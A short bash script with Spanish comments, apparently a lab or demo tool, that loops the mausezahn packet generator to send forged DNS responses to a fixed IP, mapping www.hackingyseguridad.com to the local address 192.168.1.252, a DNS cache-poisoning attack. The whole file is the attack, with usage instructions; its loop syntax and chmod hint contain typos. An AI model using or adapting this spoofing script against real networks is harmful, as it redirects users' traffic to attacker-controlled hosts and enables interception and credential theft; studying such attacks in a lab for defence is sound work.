#!/bin/bash
# Embenenamiento respusta DNS
# Antonio Taboada 09/08/2019
# Aplicar permisos con chmod *x dnspoison.sh
# Ejecutar ./dnspoison.sh
# Para parar Control + C

while : ; do; mz eth0  -B 194.179.1.100 -t dns "q=www.hackingyseguridad.com, a=192.168.1.252" done;
